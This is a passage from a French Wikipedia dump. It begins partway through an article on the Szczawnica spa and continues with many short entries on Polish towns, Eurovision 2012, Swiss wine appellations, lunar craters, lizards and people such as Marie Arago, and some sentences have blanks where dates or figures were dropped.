En 1909, Szczawnica passa entre les mains du comte Adam Stadnicki de Nawojowa. Malgré le conflit mondial qui ravageait alors l’Europe, l’activité d’Adam Stadnicki porta ses fruits et Szczawnica jouit d’un essor continu. Les établissements thermaux furent rénovés, le parc Górny agrandi et élargi aux terrains de Połonina, l’Inhalatorium, disposant de foyers pressurisés uniques alors en Pologne, construit, comme la Villa sous les mélèzes (Willa pod Modrzewiami).
Mais le début de la Seconde Guerre Mondiale stoppa le développement de la station thermale et en 1948 le gouvernement de la PRL (La République Populaire de Pologne) nationalisa la station. En 1956 la Société Thermale Nationale de Szczawnica vit le jour et orienta plus particulièrement ses activités vers le traitement des maladies professionnelles des mineurs et des métallurgistes. Les sanatoriums construits alors rendent hommage aux métiers valorisés et sont nommées par exemple Métallurgiste (Hutnik), Mineur (Gornik), ou encore Professeur (Nauczyciel), Constructeurs (Budowlani), Papetier (Papiernik), Dzwonkówka (en référence à un sommet voisin).
1973 vit l’ouverture de l’Établissement thermale de la médecine naturelle, où furent installés les équipements pour les soins : bains, inhalations, physiothérapie, massages. 
En 2005 le gouvernement polonais restitua la Station Thermale de Szczawnica aux descendants des propriétaires d’avant la guerre. Andrzej Mankowski, petit-fils du comte Adam Stadnicki et ses trois enfants décidèrent alors d’engager les moyens financiers ainsi qu’un travail considérable pour redonner à Szczawnica sa splendeur et son charme d’autrefois. 
Très vite, en 2008, la partie est de la place Dietl fut reconstruite dans sa forme historique, accueillant en son sein un bar à eaux minérales de Szczawnica, une galerie d’expositions artistiques, le café Helenka et les villas Holenderka et Szwajcarka. Dès 2009 l’hôtel cinq étoiles Modrzewie Park accueillit ses premiers clients. En 2010, le Musée de la Station Thermale fut inauguré, et plus récemment, en 2011, la reconstruction du Dworek Gościnny (Manoir Hospitalier) achevée. En 2012, en collaboration avec la ville de Szczawnica, le tout dernier projet de cette entreprise passionnée de longue haleine – la revitalisation des parcs Dolny et Górny – fut réalisée.
La station thermale : 200 ans de tradition thermale.
Szczawnica est l’une des plus belles et des plus anciennes stations thermales de Pologne. Elle doit son essor à Józef Szalay et à Józef Dietl, le véritable fondateur de l’activité thermale. Il y construisit les premiers thermes, de nouveaux bâtiments thermaux et d’hébergement et promut activement la ville en y invitant les grandes personnalités en vogue de l’époque.
La localisation de la station thermale dans la vallée de la Grajcarek, affluent de la Dunajec, entre la chaîne de montagnes des Pieniny et les Beskid Sądecki bénéficie d’un exceptionnel microclimat idéal pour les soins des affections des voies respiratoires.
12 sources, aux caractéristiques minérales acides – « szczawy » – et dont les valeurs furent reconnues dès le XVIe siècle, jaillissent au sein de la station. Encore aujourd’hui, les curistes du monde entier profitent de leurs propriétés curatives.
De fait, le magnifique Bar à eaux minérales est l’un des éléments indissociables de la station thermale. Les curistes y ont à leur disposition des eaux minérales acides contenant du bicarbonate, du sodium, de l’iode et du brome, riches en sels minéraux et en nombreux oligo-éléments. De par ces constituants, ces eaux figurent parmi les plus riches d’Europe.
Des centres de cure (sanatorium) ainsi que des centres de rééducation sont à la disposition des curistes de la station. Pas moins de 42 soins différents y sont proposés dans le domaine de l’hydrothérapie, de l’inhalation (chambres d’inhalation aux vertus reconnues), de la physiothérapie, de la kinésithérapie et les eaux minérales.
La station thermale est spécialisée dans le traitement des maladies des voies respiratoires, dont les inflammations chroniques du nez et de la gorge ; des affections de l’appareil vocal ; des affections allergiques des voies respiratoires, de l’asthme ; des affections du système locomoteur comme les maladies dégénératives des articulations et de la colonne vertébrale ainsi que les maladies rhumatismales et des inflammations des articulations. Pour le traitement des curistes ils utilisent leurs propres matières balnéologiques comme les eaux minérales appartenant à la station ainsi que les propriétés thérapeutique du microclimat local. Le matériel médical et les techniques utilisés pour les soins répondent aux standards de qualité les plus élevés. Les médecins et le personnel sont responsables de soins spécifiques en fonction de leur spécialité et sont à la disposition des curistes pour les assister dans la bonne réalisation des soins prescrits.
Les eaux thermales.
La station thermale possède des sources d'eaux minérales acides, contenant du bicarbonate, du sodium et de l'iode, riches en sels minéraux et en oligoéléments, qui sont utilisées pour soigner notamment les maladies des voies respiratoires, le catarrhe gastrique, les ulcères de l'estomac et du duodénum, le catarrhe chronique et les troubles fonctionnels de l'intestin et du côlon, les inflammations des voies urinaires, l'ostéoporose, l'artériosclérose, le rhumatisme et le diabète. 
Vous aurez le choix entre les eaux suivantes :
 JÓZEFINA - La plus ancienne source de Szczawnica, connue déjà avant 1810, son nom vient du prénom de la propriétaire de la station thermale à l’époque, Józefina Szalayowa. Eau riche en bicarbonate, chlorures et sodium, recommandée pour le traitement des catarrhes de la gorge et du nez, des inflammations, de l’asthme, de l’emphysème, de la goutte et de l’obésité. 
STEFAN - Source connue depuis 1822, son nom vient du prénom du mari de Józefina, Stefan Szalay. Eau riche en bicarbonate, chlorures, sodium et iode, recommandée pour le traitement notamment des catarrhes des voies urinaires, de la néphrolithiase, des catarrhes de la gorge, du nez et des bronches, de l’asthme et de l’emphysème. 
MAGDALENA - Source découverte en 1939, porte le nom d’une curiste, Magdalena Kownacka de Ponikwa. Eau riche en bicarbonate, chlorures, sodium et iode, recommandée pour le traitement des maladies du tube digestif, du catarrhe intestinal, du catarrhe de la vésicule biliaire et des voies biliaires, des ulcères de l’estomac et du duodénum, de l’obésité et des névroses légères. 
JAN - Source découverte en 1869. Eau riche en bicarbonate, chlorures et sodium, recommandée pour les bains d’eau thermale et la production de l’eau de table Szczawniczanka.
HELENA - Source découverte en 1844. Eau recommandée pour le traitement des maladies des voies respiratoires supérieures et inférieures, des maladies rhumatoïdes, de la néphrite chronique, de l’obésité et de l’ostéoporose ainsi que des traumatismes orthopédiques. La source Helena et la source Aniela forment ensemble la source Wanda. 
JÓZEF - Source découverte en 1986. Eau recommandée pour le traitement des maladies de l’appareil digestif, des maladies des voies respiratoires supérieures et inférieures, des maladies rhumatoïdes, des traumatismes orthopédiques, de l’obésité et de l’ostéoporose. 
Les eaux minérales de Szczawnica sont à consommer de préférence « à la source » dans les bars à eaux de sources de la station thermale, notamment au Bar à eaux de sources rénové et situé au cœur de la Place Dietla qui propose des eaux : Józefina, Stefan, Magdalena, Jan, Helena et Józef. 
Tout en profitant des bienfaits thérapeutiques des eaux, les curistes visitent les expositions et les vernissages à la Galerie du Bar à eaux de sources, situé au premier étage de l’édifice. Sont également disponibles aux curistes les sources : Szymon, découverte en 1840, la source Wanda, créée en 1867 et Pitoniakówka, datant de 1952.

</doc>
<doc id="6805398" url="https://fr.wikipedia.org/wiki?curid=6805398" title="Stary Sącz">
Stary Sącz

Stary Sącz est une ville de Pologne, située dans le sud du pays, dans la voïvodie de Petite-Pologne. Elle est le chef-lieu de la gmina de Stary Sącz, dans le powiat de Nowy Sącz.

</doc>
<doc id="6805400" url="https://fr.wikipedia.org/wiki?curid=6805400" title="Arménie au Concours Eurovision de la chanson 2012">
Arménie au Concours Eurovision de la chanson 2012

La participation de l'Arménie au Concours Eurovision de la chanson 2012 est confirmée, dans un premier temps, le après que les relations tendues entre l'Arménie et le pays hôte, l’Azerbaïdjan, ont mis en doute la participation arménienne. Le pays sélectionne son artiste et sa chanson via une sélection interne, organisée par le diffuseur arménien ARMTV. Cependant, le , l'Arménie annonce que le pays se retire du concours.
Participation confirmée du pays.
L'Arménie avait, au départ, des doutes concernant la sécurité de son possible représentant et de ses délégués en raison de la guerre du Haut-Karabagh entre le pays et la nation hôte du concours 2012, l'Azerbaïdjan. Toutefois, le , l'Union européenne de radio-télévision (UER) confirme la participation de l'Arménie au concours.
Sélection interne.
Le , ARMTV annonce qu'ils ont l'intention de choisir l'artiste et la chanson qui représentera l'Arménie en interne et qu'ils seront présentés au public le qui est le dernier jour où la sélection des chansons pour le concours 2012 est permise.
Retrait.
Le , plus de vingt chanteurs arméniens signent une pétition demandant à ARMTV de se retirer du concours. Ils citent la mort d'un soldat arménien qui aurait été tué par un sniper azerbaïdjanais quelques jours plus tôt ce qui enfreint le cessez-le-feu entre les deux pays et qui, pour eux, est une raison de leur . Toutefois, quelque temps plus tard, le ministère arménien de la Défense annonce que le soldat arménien a été tué par un autre soldat arménien et pas par l'armée azerbaïdjanaise. Mais malgré cela, les chanteurs arméniens affirment que l'Arménie ne devrait pas participer cette année et qu'ils appellent au boycott de l'Eurovision à Bakou même si le soldat arménien n'aurait pas été tué.
ARMTV et l'UER annoncent le que l'Arménie se retire du Concours Eurovision de la chanson 2012. ARMTV explique ce choix en déclarant qu'elle n'était pas convaincue que les autorités azérerbaïdjanaises mèneraient à bien leur promesse de garantir la sécurité de la délégation arménienne après le discours donné le par le président de l’Azerbaïdjan Ilham Aliyev où il déclare que les de l'Azerbaïdjan . ARMTV explique, par conséquent, qu'elle ne peut pas envoyer des participants dans un pays où ils .
Le superviseur exécutif du concours Jon Ola Sand déclare que l'UER est du retrait de l'Arménie et que . L'UER, pour ce retrait tardif, a demandé au diffuseur national arménien de payer une amende qui équivaut au montant des frais du participation habituels au concours plus 50 % du cette somme. De plus, la chaîne publique arménienne doit diffuser les deux demi-finales et la finale du concours en direct et sans interruption.
Si le pays avait participé, il aurait concouru lors de la première moitié de la seconde demi-finale du .

</doc>
<doc id="6805408" url="https://fr.wikipedia.org/wiki?curid=6805408" title="Louis de Schaetzen">
Louis de Schaetzen

Le Chevalier Louis Ulric Léonard de Schaetzen, né le à Tongres et mort dans sa ville natale le est homme politique belge bilingue, membre du parti catholique.
Il fut licencié en droit ("École de Droit, 1815, Bruxelles"). Il fut juge ff. à Maastricht (1816), membre du conseil de direction des prisons, de l'hôpital civil et du bureau de bienfaisance à Maastricht (1820); vice-président de Tribunal à Tongres (1831-36), conseiller à la chambre de la Cour d'Appel de Liège (1836-1866), ensuite président (1866-1867).

</doc>
<doc id="6805410" url="https://fr.wikipedia.org/wiki?curid=6805410" title="Anaig Butel">
Anaig Butel



</doc>
<doc id="6805412" url="https://fr.wikipedia.org/wiki?curid=6805412" title="Histoire de la Libye de 1969 à 2011">
Histoire de la Libye de 1969 à 2011



</doc>
<doc id="6805414" url="https://fr.wikipedia.org/wiki?curid=6805414" title="Virginie Mendes">
Virginie Mendes



</doc>
<doc id="6805416" url="https://fr.wikipedia.org/wiki?curid=6805416" title="Route nationale 82 (Belgique)">
Route nationale 82 (Belgique)

La route nationale 82 est une route nationale de Belgique qui relie Arlon à Virton. Celle-ci est prolongée à Virton par la route nationale 87 en direction de Montmédy en France.

</doc>
<doc id="6805417" url="https://fr.wikipedia.org/wiki?curid=6805417" title="Défense d'aimer (film, 1942)">
Défense d'aimer (film, 1942)

Défense d'aimer est un film français réalisé par Richard Pottier, sorti en 1942.

</doc>
<doc id="6805420" url="https://fr.wikipedia.org/wiki?curid=6805420" title="Unité urbaine de Cahors">
Unité urbaine de Cahors

L'unité urbaine de Cahors est une unité urbaine française centrée sur Cahors, préfecture et ville principale du Lot, au cœur de la agglomération urbaine d'Occitanie.
Données générales.
Dans le zonage réalisé par l'Insee en 2010, l'unité urbaine était composée de deux communes.
Dans le nouveau zonage réalisé en 2020, elle est composée de trois communes, la commune de Flaujac-Poujols ayant été ajoutée au périmètre.
En , avec , elle représente la unité urbaine du département du Lot et occupe le dans la région Occitanie.
En 2022, sa densité de population s'élève à . Par sa superficie, elle représente 1,8 % du territoire départemental mais, par sa population, elle regroupe 13,84 % de la population du département du Lot.
Composition 2020 de l'unité urbaine.
Elle est composée des trois communes suivantes :

</doc>
<doc id="6805428" url="https://fr.wikipedia.org/wiki?curid=6805428" title="Piwniczna-Zdrój">
Piwniczna-Zdrój

Piwniczna-Zdrój est une ville de Pologne, située dans le sud du pays, dans la voïvodie de Petite-Pologne. Elle est le chef-lieu de la gmina de Piwniczna-Zdrój, dans le powiat de Nowy Sącz.
Localisation géographique et situation administrative.
Piwniczna est située sur la rivière Poprad. Sa superficie s'étend de 357 m d'altitude (au niveau de la vallée de Poprad à proximité du hameau de Witkowskie) à 1140 m (pour les parties en amont de Wielki Rogacz).
Les plus hauts sommets de la ville sont : Eliaszówka (1024 m), Nemecowa (963 m), Granica (715m) et Kicarz (703 m).
Une ligne de chemin de fer traverse la ville, qui comprend deux gares : Piwniczna et Piwniczna-Zdrój. La ville est également traversée par la route nationale 87 qui relie Nowy Sącz à l'ancien poste frontalier de Piwniczna-Mníšek nad Popradom.

</doc>
<doc id="6805429" url="https://fr.wikipedia.org/wiki?curid=6805429" title="Vallée du Tchatkal">
Vallée du Tchatkal

La vallée du Tchatkal (en kirghize : "Чаткал өрөөнү" ; en russe : "Чаткальская долина") est une vallée du Kirghizistan, dans le Tian Shan occidental. Elle se trouve dans le cours supérieur du Tchatkal, entre le massif de Pskem et le massif de Sandalach, au nord-ouest, et entre le massif du Tchatkal au sud-est. Le nord de la vallée est bordé par l'Alataou de Talas.
Elle se situe à d'altitude dans sa partie basse et jusqu'à d'altitude dans sa partie haute. On rencontre des forêts de noyers et de genévriers, des champs et des pâtures dans le fond de la vallée, ainsi que sur ses pentes abruptes. On y rencontre l'espèce "Atraphaxis pyrifolia".

</doc>
<doc id="6805431" url="https://fr.wikipedia.org/wiki?curid=6805431" title="Vidange (ruisseau)">
Vidange (ruisseau)

La Vidange est un ruisseau français, affluent de l'Orge, qui coule dans le département de l'Essonne et la région Île-de-France.
Géographie.
Cours.
La Vidange prend sa source à Boissy-sous-Saint-Yon et rejoint l'Orge à Bruyères-le-Châtel.
Affluents.
La Vidange n'a pas d'affluent connu.
Départements et communes traversées.
Boissy-sous-Saint-Yon (source) ~ Égly ~ Bruyères-le-Châtel (embouchure)
Pour approfondir.
Bibliographie.
Parcours : .

</doc>
<doc id="6805435" url="https://fr.wikipedia.org/wiki?curid=6805435" title="Simple messieurs de l'Open d'Australie 1984">
Simple messieurs de l'Open d'Australie 1984

Résultats détaillés du simple messieurs de l'édition 1984 de l'Open d'Australie.

</doc>
<doc id="6805443" url="https://fr.wikipedia.org/wiki?curid=6805443" title="Nobuo Aoyagi">
Nobuo Aoyagi

 ( - ) est un réalisateur et producteur de cinéma japonais.
Biographie.
Né dans la préfecture de Kanagawa, Nobuo Aoyagi fréquente l'université Meiji mais la quitte avant d'être diplômé. Il travaille dans la troupe du théâtre Zenshinza avant de rejoindre les studios Tōhō en 1937. Il débute comme réalisateur en 1940 avec "Torazō no Aragamiyama". Il se fait connaître dans les années 1950 grâce à ses adaptations de manga au cinéma : la trilogie "Rakugo nagaya" (1954) et la série "Sazae-san" d'après le personnage Sazae-san créé par Machiko Hasegawa. Il participe également à la production de la série "" à la télévision.
Nobuo Aoyagi a réalisé près de 90 films entre 1940 et 1964.

</doc>
<doc id="6805445" url="https://fr.wikipedia.org/wiki?curid=6805445" title="Liste des vins AOC en Suisse">
Liste des vins AOC en Suisse

On trouve des appellations d'origine contrôlée viticoles dans 23 cantons sur un total de 26. Il s'agit des cantons de Bâle-Campagne, de Bâle-Ville, de Berne, de Fribourg, de Genève, de Glaris, des Grisons, de Jura, de Lucerne, de Neuchâtel, de Nidwald, d'Obwald, de Saint-Gall, de Schaffhouse, de Schwytz, de Soleure, du Tessin, de Thurgovie, d'Uri, du Valais, de Vaud, de Zoug et de Zurich. Les cantons d'Appenzell Rhodes-Extérieures, d'Appenzell Rhodes-Intérieures et d'Argovie n'en possèdent donc pas.
Appellation cantonale.
L'appellation d'origine contrôlée est retenue pour 21 cantons. Il s'agit des appellations :
À noter que seul le canton de Fribourg possède des appellations régionales sans que le nom du canton soit reconnu comme une AOC. 
Appellations régionales et locales par canton.
15 cantons ont une appellation sur le nom du canton sans posséder d'appellation régionale ou locale :
Canton de Berne.
Dans le canton de Berne, en plus de l'appellation Berne, on trouve deux AOC régionales :
Canton de Fribourg.
Dans le canton de Fribourg, on trouve deux AOC régionales :
Canton de Genève.
Dans le canton de Genève, en plus de l'appellation Genève, on trouve 22 AOC premier cru :
Genève a également géo référencé son vignoble
Canton de Neuchâtel.
Dans le canton de Neuchâtel, en plus de l'appellation Neuchâtel on trouve deux AOC régionales : Entre-Deux-Lacs et La Béroche, ainsi que 21 AOC locales :
Canton du Tessin.
Dans le canton du Tessin, en plus de l'appellation Ticino, on trouve 3 autres appellations cantonales : 
Canton de Vaud.
Dans le canton de Vaud, on trouve, en plus de l'appellation régionale Vaud, six appellations d'origine contrôlée locales et deux grands crus : 
Canton de Zurich.
Dans le canton de Zurich, on trouve, en plus de l'appellation Zürich, une appellation d'origine contrôlée régionale : Zürichsee.

</doc>
<doc id="6805446" url="https://fr.wikipedia.org/wiki?curid=6805446" title="Hans Hildenbrand">
Hans Hildenbrand

Hans Hildenbrand, né le à Bad Boll et mort le à Stuttgart, est un photographe allemand, connu pour ses reportages sur plaques autochromes de la Première Guerre mondiale, images qui ont été publiées en cartes postales pendant le conflit. Une fois la guerre terminée, il a travaillé pour le National Geographic.

</doc>
<doc id="6805448" url="https://fr.wikipedia.org/wiki?curid=6805448" title="Lyot (cratère lunaire)">
Lyot (cratère lunaire)

Lyot est un cratère lunaire situé à l'extrême ouest de la face visible de la Lune. Il est situé dans la Mare Australe et sa visibilité est dépendante de la libration de la Lune. Le plancher intérieur de ce cratère a été recouvert par de la lave, laissant un intérieur sombre avec un albédo qui correspond à la mare lunaire environnante. Le bord extérieur est bas et très usé, avec un périmètre qui forme un cercle quelque peu déformé. La partie sud-ouest du contour est marquée par plusieurs petits cratères en forme de bol. Il y a aussi les restes d'un cratère fantôme à l'Est du cratère. 
En 1964, l'Union astronomique internationale lui a attribué le nom de Lyot en l'honneur de l'astronome français Bernard Lyot, inventeur de la coronographie. 
Cratères satellites.
Par convention, les cratères satellites sont identifiés sur les cartes lunaires en plaçant la lettre sur le côté du point central du cratère qui est le plus proche de Lyot.

</doc>
<doc id="6805449" url="https://fr.wikipedia.org/wiki?curid=6805449" title="TASSET">
TASSET



</doc>
<doc id="6805454" url="https://fr.wikipedia.org/wiki?curid=6805454" title="Grybów">
Grybów

Grybów est une ville de Pologne, située dans le sud du pays, dans la voïvodie de Petite-Pologne. Elle constitue une gmina urbaine du powiat de Nowy Sącz.

</doc>
<doc id="6805457" url="https://fr.wikipedia.org/wiki?curid=6805457" title="Convention de l'ONU contre la corruption">
Convention de l'ONU contre la corruption



</doc>
<doc id="6805459" url="https://fr.wikipedia.org/wiki?curid=6805459" title="Gilles Saint-Hilaire">
Gilles Saint-Hilaire

Le physicien Gilles Saint-Hilaire est né en à Chicoutimi au Québec et s'est surtout fait remarquer pour avoir inventé avec l'aide de sa famille dans les années 1990, le moteur Quasiturbine Qurbine.
Formation.
Gilles Saint-Hilaire est diplômé de l'Université de Montréal. Après une courte période à Chalk River en Ontario pour l’Énergie atomique du Canada (EACL), il passe un doctorat à l’Université Paris-Sud en France en 1972, où il fit des travaux au laboratoire du Commissariat à l’Énergie atomique (CEA Saclay) près de Paris, et des recherches comme assistant professeur à l’Institut des sciences physiques à l'université de Milan en Italie, sur la physique des plasmas à haute température.
Cheminement.
De retour au Québec en 1973, il travaille une année dans le domaine de la recherche sur le Moyen-Nord à l’Université du Québec à Chicoutimi, avant de reprendre ses recherches sur la physique des interactions plasmas laser-matière à l’Institut national de la recherche scientifique (INRS) et au laboratoire de recherche d’Hydro-Québec (IREQ) à Varennes, jusqu’en 1976 .
Il passe les trois années suivantes comme directeur des énergies nouvelles et nucléaires au gouvernement du Québec, et comme conseiller en R&amp;D locale et internationale auprès de plusieurs ministres. Ces années faisant suite à la première crise énergétique mondiale devenue hautement stratégique, les gouvernements nommant des ministres de l'énergie pour s'impliquer directement, et questionner entre autres ici les solutions d'avenir d'Hydro-Québec qui soutenait alors (1978) des prévisions de la demande électrique de 10 à 14% par an jusqu'à la fin du siècle dernier, et justifiait l'urgence d'identifier 35 sites nucléaires dans la vallée du Saint-Laurent. Le gouvernement d'alors a plutôt choisi de miser sur une croissance plus modeste, un potentiel considérable d'économies d'énergie, une mise en valeur des énergies nouvelles et une modeste présence technologique en nucléaire (en tronquant l'avenir de l'usine d'eau lourde de Laprade en partie, contre un prestigieux projet - mal aimé - de recherche Tokamac à l'IREQ). Il va sans dire que les dirigeants des grandes firmes nucléaires, les instituts de haut savoir et l'H.-Q. ont alors peu apprécié ce qui leur échappait, et gardé en mémoire le nom des influenceurs présumés! Pourtant ce sont ses interventions favorables au Tokamac de Varennes qui ont déclenchées le financement initial Québec-Canada. Quelque vingt-cinq ans plus tard, H.-Q. se préparait à fermer la centrale nucléaire de Gentilly.
En 1980, il devient l’un des directeurs de Trans-Québec &amp; Maritimes, le maître d’œuvre d’un projet de 2 milliards de $ de dans l’est du Canada. Il est l'auteur d'une première étude sur l'implantation d'un " Centre de commutation gazier international au Québec " .
Aventure familiale.
Alors que la planification du projet de gazoduc arrivait à terme, et après plus de 15 années fort animées, il s’embarque sur un voilier pour une croisière familiale de 3 ans dans les Caraïbes avec son épouse et ses deux fils. Là, il entend presque quotidiennement des plaintes au sujet de moteurs bruyants et difficiles à démarrer, tel que les stationnaires, les outboards, les génératrices, les compresseurs de scuba, les tronçonneuses! Ce fut le début du défi « meilleur moteur! »…
Le moteur Quasiturbine.
De retour au Québec en 1985, il acquiert une Agence de Communications et de publications, qu’il cède au début des années 1990 pour se consacrer davantage aux travaux d’innovation de la théorie Quasiturbine Qurbine sur la mise en forme des profils de compression, avec son épouse Françoise, une diplômée en maîtrise de la Sorbonne, et ses deux fils : Ylian, maître en informatique de l'UQAM et Roxan, ingénieur en génie électrique de École polytechnique de Montréal et MBA de Université de Californie à Berkeley. Aujourd’hui, la Quasiturbine est un concept moteur rotatif différent du Wankel bien référencé, et souvent cité sur l’Internet , et les experts en moteurs du monde entier acceptent la théorie Quasiturbine à zéro vibration, et les dispositifs correspondants.
Para professionnel.
L’intérêt de Gilles Saint-Hilaire pour les moteurs n’est pas étranger au fait qu’il détienne une licence de Capitaine de bateau de la Garde Côtière Américaine, et une licence professionnelle de pilote d’avions multi-moteur, tout comme ses deux fils d'ailleurs. On peut occasionnellement s'entretenir avec lui sur les fréquences radio amateur, sous les indicatifs de VE2PHD ou WP2ADT.

</doc>
<doc id="6805461" url="https://fr.wikipedia.org/wiki?curid=6805461" title="Convention des Nations Unies contre la corruption">
Convention des Nations Unies contre la corruption



</doc>
<doc id="6805463" url="https://fr.wikipedia.org/wiki?curid=6805463" title="Tropidophorus partelloi">
Tropidophorus partelloi

Tropidophorus partelloi est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique de Mindanao aux Philippines.
Étymologie.
Cette espèce est nommée en l'honneur de Joseph McDowell Trimble Partello (1851–1934).

</doc>
<doc id="6805465" url="https://fr.wikipedia.org/wiki?curid=6805465" title="Championnat de France de football américain 2013">
Championnat de France de football américain 2013

Le championnat de France de football américain 2013, appelé Casque de diamant 2013, est la du championnat de France de football américain. Elle met aux prises neuf équipes réparties en deux poules géographiques (Nord et Sud), qui s'affrontent lors de la saison régulière, chaque équipe jouant dix matches. Les quatre premières équipes à l'issue de la saison régulière s'affrontent en play-off pour désigner le Champion de France 2013.
Déroulement du championnat.
Équipes participantes.
Le championnat compte neuf clubs répartis en deux poules géographiques (Nord et Sud) de quatre et cinq clubs. Les clubs participants sont les trois premières équipes de chaque poule de la saison régulière 2012 (Flash de La Courneuve, Molosses d'Asnières, Spartiates d'Amiens, Black Panthers de Thonon, Centaures de Grenoble, Dauphins de Nice), le vainqueur du barrage entre le dernier de la poule Nord de la saison régulière 2012 et le vainqueur de la poule Nord du casque d'or (Templiers d'Élancourt), et le vainqueur du barrage entre le dernier de la poule Sud de la saison régulière 2012 et le vainqueur de la poule Sud du casque d'or (Kangourous de Pessac). Le club des Cougars de Saint-Ouen-l'Aumône a été repêché.
 Tenant du titre.
 Promu de Division 2.
Formule.
Les points sont répartis comme suit :

</doc>
<doc id="6805470" url="https://fr.wikipedia.org/wiki?curid=6805470" title="Tropidophorus microlepis">
Tropidophorus microlepis

Tropidophorus microlepis est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce se rencontre dans le sud de la Thaïlande, au Viêt Nam, au Cambodge et au Laos.

</doc>
<doc id="6805471" url="https://fr.wikipedia.org/wiki?curid=6805471" title="Powiat de Sucha Beskidzka">
Powiat de Sucha Beskidzka



</doc>
<doc id="6805473" url="https://fr.wikipedia.org/wiki?curid=6805473" title="Jordanów">
Jordanów

Jordanów est une ville de Pologne, située dans le sud du pays, dans la voïvodie de Petite-Pologne. Elle constitue une gmina urbaine du powiat de Sucha.

</doc>
<doc id="6805476" url="https://fr.wikipedia.org/wiki?curid=6805476" title="Tropidophorus rivularis">
Tropidophorus rivularis



</doc>
<doc id="6805477" url="https://fr.wikipedia.org/wiki?curid=6805477" title="Tropidophorus stejnegeri">
Tropidophorus stejnegeri



</doc>
<doc id="6805478" url="https://fr.wikipedia.org/wiki?curid=6805478" title="Tropidophorus misaminius">
Tropidophorus misaminius

Tropidophorus misaminius est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique des Philippines. Elle se rencontre sur les îles de Basilan, de Camiguin et de Mindanao.

</doc>
<doc id="6805480" url="https://fr.wikipedia.org/wiki?curid=6805480" title="Maupertuis (cratère)">
Maupertuis (cratère)

Maupertuis est un cratère lunaire situé sur la face visible de la Lune. Il se trouve sur le bord sud de la Mare Frigoris et du cratère La Condamine, dans l'hémisphère nord de la Lune. Il longe la crête nord-est du Sinus Iridum et le nord-ouest de la Mare Imbrium. Le cratère est très érodé par de nombreux impacts de cratères. Le bord extérieur est un légèrement pentagonal. Au nord-est part une faille appelée "Rimae Maupertuis".
En 1935, l'Union astronomique internationale a donné le nom du scientifique français Pierre Louis Maupertuis à ce cratère lunaire.
Par convention, les cratères satellites sont identifiés sur les cartes lunaires en plaçant la lettre sur le côté du point central du cratère qui est le plus proche de Maupertuis.

</doc>
<doc id="6805481" url="https://fr.wikipedia.org/wiki?curid=6805481" title="Tropidophorus iniquus">
Tropidophorus iniquus

Tropidophorus iniquus est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique du Kalimantan en Indonésie.

</doc>
<doc id="6805484" url="https://fr.wikipedia.org/wiki?curid=6805484" title="Marie Arago">
Marie Arago

Marie-Anne Roig, dite Marie Arago, née le à Corneilla-la-Rivière et morte le à Estagel, est la femme de François Bonaventure Arago et la mère de François, Jean, Jacques, Victor, Joseph et Étienne Arago.
Élevant seule ses huit enfants après la mort de son mari en 1814, elle leur transmet ses valeurs humaines et les encourage à poursuivre des études. Autour de son fils aîné, François, se crée ainsi à l'Observatoire de Paris un « clan Arago », avec notamment Claude-Louis Mathieu (qui épouse sa sœur Marguerite), Alexander von Humboldt ou encore Félix Savary.
Biographie.
Origines et jeunesse (1755-1778).
Marie-Anne-Agathe Roig nait le à Corneilla-la-Rivière, un village d'environ 700 habitants situé dans la province du Roussillon, une région de langue catalane appartenant à la France depuis 1659. Son père, François Roig, est un "pagès", c'est-à-dire un paysan aisé, de Corneilla-la-Rivière. Il a été militaire, avec un grade d'officier. Son grand-père paternel, Camo Roig, est médecin. Son oncle paternel est curé de Ponteilla, autre village de cette même région du Sud de la France, à une douzaine de kilomètres au sud-est de Corneilla-la-Rivière.
Sa mère, nommée Victoire Brial, est la fille d'un "pagès" de Camélas, un village situé également à une douzaine de kilomètres de Corneilla-la-Rivière, mais au sud-sud-ouest cette fois.
À une époque où quasiment toutes les femmes de la région sont illettrées (90 % des femmes de sa génération ne sont pas capables de signer leur acte de mariage), elle apprend à lire et à écrire seule, dans des livres écrits en latin, en se cachant.
Estagel (1778-1797).
Le , dotée de , elle épouse, à Corneilla-la-Rivière, François Bonaventure Arago, "pagès" et licencié en droit, de qui elle aura onze enfants élevés dans la langue locale : le catalan. Le couple s'installe à Estagel, bourg roussillonnais d'un millier d'habitants situé à une douzaine de kilomètres au nord de Corneilla-la-Rivière.
François Bonaventure Arago est du même milieu social que Marie Roig. Cultivateur et propriétaire moyennement aisé, il a été orphelin très jeune et a été élevé par un oncle prêtre qui lui a fait suivre des études de droit à Perpignan. Son origine sociale ne lui permet cependant pas de prétendre à un emploi plus réputé comme notaire ou avocat.
En 1779, Marie Arago donne naissance à une fille, Marie-Rose, qui meurt en 1780. 1780 est également l'année de la naissance et de la mort de la deuxième fille du couple Arago : Marie-Thérèse. Une troisième fille, prénommée Marie-Victoire, nait et meurt en bas âge en 1783. Entre-temps, en 1782, le couple donne la vie à une autre fille, Rose (qui vivra jusqu'en 1832).
En 1781, son mari entame une carrière politique, gravissant peu à peu les échelons dans les responsabilités municipales du village d'Estagel jusqu'à devenir, de à , premier consul du village, ce qui correspond au mandat de maire actuel. En 1789, il rédige une grande partie du cahier de doléances d'Estagel. Il devient en 1790 le premier maire de la commune nouvellement créée par la révolution, puis obtient les années suivantes de hautes responsabilités départementales. Marie donne naissance à d'autres enfants : François (1786), Jean (1788), Jacques (1790), Victor (1792), Joseph (1796) et Marguerite (1798), tous nés à Estagel.
Lors de la guerre contre l'Espagne, en 1793, François Bonaventure commande la Garde nationale d'Estagel, une armée de citoyens volontaires formée pour défendre la Révolution contre l'ennemi espagnol. La maison familiale héberge alors de nombreux soldats et officiers français, ce à quoi François, l'aîné des fils, alors âgé de sept ans, attribuera plus tard son goût pour la chose militaire.
Retour à Estagel (1816-1845).
Après la mort de sa fille Rose, elle devient, à 77 ans, la tutrice des quatre enfants de celle-ci.
Famille et entourage.
Selon Muriel Toulotte, biographe d'Étienne Arago, . Les enfants de Marie et François Bonaventure Arago se comportent tous avec droiture et honnêteté, selon l'exemple de leur père. De leur mère, ils tiennent à la fois le dynamisme qui les anime, de la bonté envers autrui et une grande gaieté. Par contre, les garçons sont beaucoup moins croyants que leur mère, Jacques étant non croyant, Étienne allant jusqu'à demander à être enterré sans cérémonie religieuse.
Elle a six fils, qui se distinguent tous :
